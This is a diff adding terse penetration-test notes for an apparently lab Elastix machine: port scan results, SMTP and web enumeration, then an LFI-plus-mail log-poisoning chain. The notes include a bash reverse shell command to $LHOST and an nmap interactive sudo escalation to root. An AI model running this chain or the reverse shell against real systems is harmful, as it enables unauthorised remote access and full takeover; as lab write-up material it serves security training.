@@ -1,0 +1,42 @@
+OS:
+- like CentOS
+
+Open Ports:
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+- running smtp-user-enum
+- ran scanner/smtp/smtp_enum
+
+80/tcp    open  http
+- webserver: elastix
+- not able to find any version info
+- tried common default passwords, no luck
+- ran dirb and nikto
+
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+143/tcp   open  imap
+443/tcp   open  https
+993/tcp   open  imaps
+995/tcp   open  pop3s
+3306/tcp  open  mysql
+4445/tcp  open  upnotifyp
+10000/tcp open  snet-sensor-mgmt
+
+
+- found LFI exploit for webserver
+- checking which user it's running as
+- asterisk
+- connect to port 25 w/ nc
+- send fake email to asterisk@localhost
+- added php payload
+- set up nc listener
+- modified burp request to send cmd: bash -i >& /dev/tcp/$LHOST/1337 0>&1
+- got remote shell
+- logged in as user asterisk
+- check sudo -l
+- user can run nmap as admin
+- run nmap interactive
+- open !sh
+- root access
